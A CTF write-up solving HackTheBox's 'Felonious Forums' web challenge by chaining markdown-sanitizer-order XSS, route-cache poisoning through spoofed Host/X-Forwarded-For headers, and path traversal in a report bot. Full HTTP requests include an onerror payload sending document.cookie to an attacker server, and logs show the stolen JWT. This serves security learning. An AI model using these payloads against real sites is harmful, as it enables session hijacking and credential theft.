# Felonious Forums (Medium difficulty)

This was a Medium difficulty challenge from the Dirty Money CTF held by HTB from Friday June 15th 2022 through Sunday June 17th 2022.

## Description

> Our threat intelligence has traced a reseller of the GrandMonty Ransomware linked with the Monkey Business group to this illegal forums platform. We need you to investigate the platform to find any security loopholes that can provide us access to the platform.

## Setup

For this challenge we are given the source code of the application including docker file and build instructions so it can be executed locally. The whole structure of the project is the following:

```
├── Dockerfile
├── build-docker.sh
├── challenge
│   ├── bot.js
│   ├── database.js
│   ├── helpers
│   │   ├── JWTHelper.js
│   │   └── MDHelper.js
│   ├── index.js
│   ├── middleware
│   │   └── AuthMiddleware.js
│   ├── package-lock.json
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── css
│   │   │   ├── auth.css
│   │   │   ├── bootstrap.min.css
│   │   │   ├── easymde.min.css
│   │   │   ├── font-awesome.css
│   │   │   ├── global.css
│   │   │   ├── main.css
│   │   │   └── single.css
│   │   ├── images
│   │   │   ├── ANDCerberus.webp
│   │   │   ├── admin.png
│   │   │   ├── ads_1.gif
│   │   │   ├── ads_2.gif
│   │   │   ├── ads_3.gif
│   │   │   ├── aquaman.webp
│   │   │   ├── banner.png
│   │   │   ├── banner1.png
│   │   │   ├── bg.jpeg
│   │   │   ├── bg.jpg
│   │   │   ├── fbi.png
│   │   │   ├── gifs
│   │   │   │   ├── drive.gif
│   │   │   │   ├── gib.png
│   │   │   │   ├── king.gif
│   │   │   │   ├── monkas.png
│   │   │   │   ├── pepejail.gif
│   │   │   │   ├── police.png
│   │   │   │   └── sleepingpepe.png
│   │   │   ├── hecker.webp
│   │   │   ├── leaker.jpg
│   │   │   ├── logo.png
│   │   │   ├── logo_large.png
│   │   │   ├── monty.png
│   │   │   ├── newbie.webp
│   │   │   ├── reseller.jpg
│   │   │   ├── zoidberg.webp
│   │   │   └── zoldyck.webp
│   │   ├── js
│   │   │   ├── auth.js
│   │   │   ├── bootstrap.min.js
│   │   │   ├── easymde.min.js
│   │   │   ├── global.js
│   │   │   └── jquery-3.6.0.min.js
│   │   └── vendors
│   │       └── mdi
│   │           ├── fonts
│   │           │   ├── materialdesignicons-webfont.eot
│   │           │   ├── materialdesignicons-webfont.ttf
│   │           │   ├── materialdesignicons-webfont.woff
│   │           │   └── materialdesignicons-webfont.woff2
│   │           └── materialdesignicons.min.css
│   └── views
│       ├── home.html
│       ├── login.html
│       ├── new-thread.html
│       ├── preview-thread.html
│       ├── register.html
│       ├── report.html
│       └── thread.html
├── config
│   └── supervisord.conf
└── flag.txt
```

The project comes with instructions to build and execute:

```bash
#!/bin/bash
docker rm -f web_felonious_forums
docker build -t web_felonious_forums .
docker run --name=web_felonious_forums --rm -p1337:1337 -it web_felonious_forums
```

I also ran a base scan of the image using snyk (it comes by default with docker now):

```bash
docker scan web_felonious_forums

Testing web_felonious_forums...

✗ Low severity vulnerability found in xdg-utils
  Description: Information Exposure
  Info: https://snyk.io/vuln/SNYK-DEBIAN10-XDGUTILS-1042780
  Introduced through: google-chrome-stable@103.0.5060.114-1
  From: google-chrome-stable@103.0.5060.114-1 > xdg-utils@1.1.3-1+deb10u1
  Image layer: 'apt-get install -y google-chrome-stable libxss1 libxshmfence-dev --no-install-recommends'

...snip...

✗ High severity vulnerability found in gcc-8/libstdc++6
  Description: Information Exposure
  Info: https://snyk.io/vuln/SNYK-DEBIAN10-GCC8-347558
  Introduced through: gcc-8/libstdc++6@8.3.0-6, apt@1.8.2.3, google-chrome-stable@103.0.5060.114-1, meta-common-packages@meta
  From: gcc-8/libstdc++6@8.3.0-6
  From: apt@1.8.2.3 > gcc-8/libstdc++6@8.3.0-6
  From: apt@1.8.2.3 > apt/libapt-pkg5.0@1.8.2.3 > gcc-8/libstdc++6@8.3.0-6
  and 4 more...
  Image layer: 'apt-get install -y google-chrome-stable libxss1 libxshmfence-dev --no-install-recommends'

✗ High severity vulnerability found in curl/libcurl3-gnutls
  Description: Improper Authentication
  Info: https://snyk.io/vuln/SNYK-DEBIAN10-CURL-2805484
  Introduced through: google-chrome-stable@103.0.5060.114-1
  From: google-chrome-stable@103.0.5060.114-1 > curl/libcurl3-gnutls@7.64.0-4+deb10u2
  Image layer: 'apt-get install -y google-chrome-stable libxss1 libxshmfence-dev --no-install-recommends'

✗ High severity vulnerability found in curl/libcurl3-gnutls
  Description: Improper Certificate Validation
  Info: https://snyk.io/vuln/SNYK-DEBIAN10-CURL-2813757
  Introduced through: google-chrome-stable@103.0.5060.114-1
  From: google-chrome-stable@103.0.5060.114-1 > curl/libcurl3-gnutls@7.64.0-4+deb10u2
  Image layer: 'apt-get install -y google-chrome-stable libxss1 libxshmfence-dev --no-install-recommends'

✗ High severity vulnerability found in curl/libcurl3-gnutls
  Description: Loop with Unreachable Exit Condition ('Infinite Loop')
  Info: https://snyk.io/vuln/SNYK-DEBIAN10-CURL-2813772
  Introduced through: google-chrome-stable@103.0.5060.114-1
  From: google-chrome-stable@103.0.5060.114-1 > curl/libcurl3-gnutls@7.64.0-4+deb10u2
  Image layer: 'apt-get install -y google-chrome-stable libxss1 libxshmfence-dev --no-install-recommends'

Package manager:   deb
Project name:      docker-image|web_felonious_forums
Docker image:      web_felonious_forums
Platform:          linux/amd64
Base image:        node:18.6.0-buster-slim

Tested 258 dependencies for known vulnerabilities, found 183 vulnerabilities.

Base Image               Vulnerabilities  Severity
node:18.6.0-buster-slim  70               0 critical, 1 high, 0 medium, 69 low

Recommendations for base image upgrade:

Alternative image types
Base Image        Vulnerabilities  Severity
node:18.6.0-slim  43               0 critical, 0 high, 0 medium, 43 low
```

We get about 183 vulnerabilities, with 4 high risk onesrelated to Google Chrome. Most of these are just dependencies and can be hard to get any direct vulnerabilities out of these, so I'll not look into these ones for now. We'll come back to these if needed.

## Objective

Right away you can see that a flag.txt file is included. This file contains an example flag that mirrors the one in the real server, which is the objective:

> HTB{f4k3_fl4g_f0r_t3st1ng}

## Finding the flag

Since we are given the source code, I decided to dive right into it and work my way from the flag backwards to see how we can reach it.
A quick search for the flag file points us to **bot.js**

```bash
grep -H -R flag.txt .
./challenge/bot.js:const flag = fs.readFileSync('/flag.txt', 'utf8');
./Dockerfile:COPY flag.txt /flag.txt
```

Checking the file, we can see the bot is using Puppeteer and is setting the flag as part of a JWT in it's cookies:

```javascript
let token = await JWTHelper.sign({ username: 'moderator', user_role: 'moderator', flag: flag });
		await page.setCookie({
			name: "session",
			'value': token,
			domain: "127.0.0.1:1337"
		});
```

It's also important to note the **id** parameter in the **visitPage** function is not being validated/sanitized in any way, and this is used to point the bot to a URL. If this id can be manipulated by the user, then we can make the bot visit any page in the domain (127.0.0.1) via path traversal:

```javascript
await page.goto(`http://127.0.0.1:1337/report/${id}`, {
			waitUntil: 'networkidle2',
			timeout: 5000
		});
```

Now, we need to know where this **visitPage** function is invoked, and we find that it's invoked in the **routes/index.js** file:

```javascript
router.post('/api/report', async (req, res) => {
	const { post_id } = req.body;
	if (botVisiting) return res.status(403).send(response('Please wait for the previous report to process first!'));
	if(post_id) {
		botVisiting = true;
		return bot.visitPost(post_id)
			.then(() => {
				botVisiting = false;
				return res.send(response('Report received successfully!'));
			})
			.catch(e => {
				console.log(e);
				botVisiting = false;
				return res.status(403).send(response('Something went wrong, please try again!'));
			})
	}
	return res.status(500).send(response('Missing required parameters!'));
});
```

POST requests to /api/report result in the bot visiting the page specified by the **post_id** parameter. Again, we see that this parameter is not being validated nor sanitized, so we can manipulati this the have the bot visit other pages. Also worth noticing this route does not require authentication, for whatever reason

Now we need to know where this report request is sent. We can check the views to see where this gets invoked and we find **./challenge/static/js/global.js**. This file has a function **reportThreadPost** defined which invokes /api/report, and is bound to elements with the **.p-report** class:

```javascript
if ($('.p-report').length) {
    $('.p-report').on('click', (el) => {
        reportThreadPost(el.target.dataset.post_id);
    });
}
```

This corresponds to the "REPORT" button on thread pages as can be seen in ./challenge/views/thread.html. Now, this is probably o good time to take a look at the application to make sense of what we're seeing.

## The application

![](login.png)

We first get to the login page, but we don't have to fight our way in, as registration is open to anyone. We just register a user and go in.

![](home.png)

Most of the stuff is not really usable, but we have access to a few functionalities: reading threads, replying to threads/comments and creating new threads.
Now, on threads there are 2 interesting parts; one is the report button, and the other one is the box to post replies:

![](report_reply.png)

What's interesting is that the application is allowing Markdown syntax in comments, which is then transformed to HTML. This is an idicator that we may be looking at XSS as the attack vector to get the bot's cookie. If we can inject javascript somehow in a page ang get the bot to visit, we gan get the flag in its cookie.

## Finding XSS

So, now that we identified a potential attack vector, we need to find if it's actually possible to get XSS in the application. I toyed a bit with the comments, but didn't really find a vulnerable spot, so I went back to the source code. First I checked the route where replies are sent:

```javascript
router.post('/api/threads/reply', AuthMiddleware, async (req, res) => {
	const { id, comment } = req.body;
	const html_content = makeHTML(comment);

	if(!isNaN(parseInt(id))) {
		return db.postThreadReply(req.user.id, parseInt(id), filterInput(html_content))
			.then(() => {
				res.send(response('Thread reply posted successfully!'));
			})
			.catch((e) => {
				res.status(500).send(response('Failed to post thread reply!'));
			});
	} else {
		return res.status(500).send(response('Missing required parameters!'));
	}
});
```

The app invokes **makeHTML()** and **filterInput()** to process the input before saving it to the DB. An these ones are defined in **MDHelper.js**:

```javascript
const conv = new showdown.Converter({
	completeHTMLDocument: false,
	tables: true,
	ghCodeBlocks: true,
	simpleLineBreaks: true,
	strikethrough: true,
	metadata: false,
	emoji: true
});

const filterInput = (userInput) => {
    window = new JSDOM('').window;
    DOMPurify = createDOMPurify(window);
    return DOMPurify.sanitize(userInput, {ALLOWED_TAGS: ['strong', 'em', 'img', 'a', 's', 'ul', 'ol', 'li']});
}

const makeHTML = (markdown) => {
    return conv.makeHtml(markdown);
}
```

MakeHTML is using Showdown to convert markdown into HTML, and then DOMPurify is used to sanitize the HTML. DOMPurify is a very well tested library and it's unlikely we will find a vulnerability on it, so I checked versions and previosuly reported vulnerabilities, but didn't really find any known vulnerabilities for the used version, which is was up to date at the start of the CTF.
Seeing tihs, I considered the injection could be somwhere else, like usernames or other inputs that could be manipulated, but the inputs were being consistently HTML escaped. So then I noticed the app is using **nunjucks**, a templating library to autoescape all params in views by default:

```javascript
nunjucks.configure('views', {
	autoescape: true,
	express: app
});
```

Again, I found no vulnerabilities for the version used of nunjucks. Nunjucks can use a filter named **safe** to define parameters that won't be escaped in views. So we can search places where this filter is being used:

```bash
$ grep -H -R "| safe" .
./challenge/views/preview-thread.html: {{ content | safe }}
./challenge/views/report.html:         {{ threadPost.comment | safe }}
./challenge/views/thread.html:         {{ post.comment | safe }}
```

We can see that the **report** and **thread** views have the safe filter, but also the **preview-thread** view, which we hadn't considered until now. Both report and thread views are reflecting the DOMPurified data, so these are likely not vulnerable, but preview-thread might be:

```javascript
router.post('/threads/preview', AuthMiddleware, routeCache.cacheSeconds(30, cacheKey), async (req, res) => {
	const {title, content, cat_id} = req.body;

	if (cat_id == 1) {
		if (req.user.user_role !== 'Administrator') {
			return res.status(403).send(response('Not Allowed!'));
		}
	}

	category = await db.getCategoryById(parseInt(cat_id));
	safeContent = makeHTML(filterInput(content));

	return res.render('preview-thread.html', {category, title, content:safeContent, user:req.user});
});
```

Here we see something interesting. **filterInput()** and **makeHTML()** are also invoked to get **"safeContent"**, but the order is reveresed. The input is being sanitized and the converted from markup to HTML. If the markdown library can be tricked to escape the tag and inject attributes or HTML directly, then we can get XSS. So then we try this on the thread preview page:

### Request
```http
POST /threads/preview?1658271441355 HTTP/1.1
Host: 192.168.1.118:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Origin: http://192.168.1.118:1337
DNT: 1
Connection: close
Referer: http://192.168.1.118:1337/threads/new
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTEsInVzZXJuYW1lIjoibXl1c2VyIiwicmVwdXRhdGlvbiI6MCwiY3JlZGl0cyI6MTAwLCJ1c2VyX3JvbGUiOiJOZXdiaWUiLCJhdmF0YXIiOiJuZXdiaWUud2VicCIsImpvaW5lZCI6IjIwMjItMDctMTkgMjA6MTI6MzUiLCJpYXQiOjE2NTgyNjk1Mzd9.VavmLYqwPLmxWSx7L13cGLZRCUTKrtwE6zzEdwNotms
Upgrade-Insecure-Requests: 1

title=test&content=xss_here![](http://non_existent.net/fail"onerror="alert(123))&cat_id=2
```

### Response
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 7196
ETag: W/"1c1c-y24c+bXd8snI8YSfrXyIHlzxSVo"
Date: Tue, 19 Jul 2022 22:58:23 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8" />
      <title>Felonious Forums | Preview Thread</title>
...snip...
            <div id="_pcon">
                <p>xss_here<img src="http://non_existent.net/fail"onerror="alert(123)" alt="" /></p>
            </div>
...snip...
```

![](xss_alert.png)

So there it is, we have XSS!

## Now what?

So we can get XSS on a page, but it's a POST request and it's not a stored XSS. So haw can we get the bot to make such a request?
I was stuck here for quite a while, but finally noticed something else. Thinking back, I could have noticed before because when I was testing my XSS injection, I sent a request and then made a different one with a slightly different payload but got the same response from the first payload. At the time I though there was some sort of validation on the payload, like a WAF or something, but what was happening? **CACHING**

This was the last part of the puzzle; you can see that the 2 routes related to previews have some sort of caching enabled:

```javascript
const routeCache = require('route-cache');
...snip...
const cacheKey = (req, res) => {
	return `_${req.headers.host}_${req.url}_${(req.headers['x-forwarded-for'] || req.ip)}`;
}

...snip...

router.post('/threads/preview', AuthMiddleware, routeCache.cacheSeconds(30, cacheKey), async (req, res) => {
...snip...
});

router.get('/threads/preview', AuthMiddleware, routeCache.cacheSeconds(30, cacheKey), async (req, res) => {
	return res.redirect('/threads/new');
});
```

The **/threads/preview** route has caching enabled with route-cache for 30 seconds with a defined **cacheKey**. This cacheKey is defined as a string containing the Host header, the request URL and the IP of the sender **OR** the content of the X-Forwarded-For header. This means that a route will be cached for 30 seconds for a client that matches the cacheKey. That is, if the host header, URL and IP (or X-Forwarded-For header) for a request is the same, the cached response will be returned instead of processing the new request.

This is just what we needed; now we can make a POST request to **/threads/preview** faking the headers to match the key that the bot would match and containing XSS. When the bot makes a request to GET the same URL, the bot will get the cached response with XSS!

So let's try that out. We add the X-Forwarded-For header and change the host header to match 127.0.0.1:1337, which is the IP that the bot uses:

### Request 1 (Inject XSS)
```http
POST /threads/preview?123 HTTP/1.1
Host: 127.0.0.1:1337
X-Forwarded-For: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Origin: http://192.168.1.118:1337
DNT: 1
Connection: close
Referer: http://192.168.1.118:1337/threads/new
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTEsInVzZXJuYW1lIjoibXl1c2VyIiwicmVwdXRhdGlvbiI6MCwiY3JlZGl0cyI6MTAwLCJ1c2VyX3JvbGUiOiJOZXdiaWUiLCJhdmF0YXIiOiJuZXdiaWUud2VicCIsImpvaW5lZCI6IjIwMjItMDctMTkgMjA6MTI6MzUiLCJpYXQiOjE2NTgyNjk1Mzd9.VavmLYqwPLmxWSx7L13cGLZRCUTKrtwE6zzEdwNotms
Upgrade-Insecure-Requests: 1

title=&content=xss_here![](http://<my_server_ip>/img"onerror="window.location='http://<my_server_ip>/'%2bdocument.cookie)&cat_id=2
```
### Response 1 (Inject XSS)
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 7241
ETag: W/"1c49-wZFYIEebTM5A+qV6pLY4g62Kr6s"
Date: Tue, 19 Jul 2022 22:47:59 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8" />
      <title>Felonious Forums | Preview Thread
...snip...
<div id="_pcon">
    <p>xss_here<img src="http://<my_server_ip>/img"onerror="window.location='http://<my_server_ip>/'+document.cookie" alt="" /></p>
</div>
..snip...
```

Now we can simulate a GET request like the one the bot would make:

### Request 2 (Simulate Bot request. Optional)
```http
GET /threads/preview?123 HTTP/1.1
Host: 127.0.0.1:1337
X-Forwarded-For: 127.0.0.1
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTEsInVzZXJuYW1lIjoibXl1c2VyIiwicmVwdXRhdGlvbiI6MCwiY3JlZGl0cyI6MTAwLCJ1c2VyX3JvbGUiOiJOZXdiaWUiLCJhdmF0YXIiOiJuZXdiaWUud2VicCIsImpvaW5lZCI6IjIwMjItMDctMTkgMjA6MTI6MzUiLCJpYXQiOjE2NTgyNjk1Mzd9.VavmLYqwPLmxWSx7L13cGLZRCUTKrtwE6zzEdwNotms
```

### Response 2 (Simulate Bot request. Optional)
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 7241
ETag: W/"1c49-wZFYIEebTM5A+qV6pLY4g62Kr6s"
Date: Tue, 19 Jul 2022 22:48:04 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8" />
      <title>Felonious Forums | Preview Thread</title>
...snip...
<div id="_pcon">
    <p>xss_here<img src="http://<my_server_ip>/img"onerror="window.location='http://<my_server_ip>/'+document.cookie" alt="" /></p>
</div>
...snip...
```

You can see the ETag returned is the same, which indicates we're hitting the cached content. Now all that's left is sending the bot to this page:

### Request 3 (Send the bot to the cached page)
```http
POST /api/report HTTP/1.1
Host: 192.168.1.118:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 36
DNT: 1
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTEsInVzZXJuYW1lIjoibXl1c2VyIiwicmVwdXRhdGlvbiI6MCwiY3JlZGl0cyI6MTAwLCJ1c2VyX3JvbGUiOiJOZXdiaWUiLCJhdmF0YXIiOiJuZXdiaWUud2VicCIsImpvaW5lZCI6IjIwMjItMDctMTkgMjA6MTI6MzUiLCJpYXQiOjE2NTgyNjk1Mzd9.VavmLYqwPLmxWSx7L13cGLZRCUTKrtwE6zzEdwNotms

{"post_id":"../threads/preview?123"}
```

### Response 3 (Send the bot to the cached page)
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 43
ETag: W/"2b-NN8PPBl7kFrrzCrU/wo9zyOL7/A"
Date: Tue, 19 Jul 2022 22:48:17 GMT
Connection: close

{"message":"Report received successfully!"}
```

Server returned an ok response, so we check our remote server to see what we got:

```bash
# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
<my_home_ip> - - [19/Jul/2022 22:48:15] "GET /img HTTP/1.1" 200 -
<my_home_ip> - - [19/Jul/2022 22:48:15] code 404, message File not found
<my_home_ip> - - [19/Jul/2022 22:48:15] "GET /session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVzZXJfcm9sZSI6Im1vZGVyYXRvciIsImZsYWciOiJIVEJ7ZjRrM19mbDRnX2Ywcl90M3N0MW5nfVxuIiwiaWF0IjoxNjU4MjcwODk0fQ.-nCvjIlXyWw2HDIfPuX_Rq7I4_uGnNuujQjLh0kjBj4
```

We decode the JWT payload, and there it is:

```json
{"username":"moderator","user_role":"moderator","flag":"HTB{f4k3_fl4g_f0r_t3st1ng}\n","iat":1658270894}
```

## Conlusion

This was a really interesting challenge for me, because I had never exploited an application abusing its caching mechanism. Now I'll know to pay more attention to these details in the future. It was also my first international CTF, so it was exciting and humbling. I couldn't get this flag in time (I noticed the cache stuff about 30 minutes before it ended), but sure was happy to have solved the challenge nonetheless.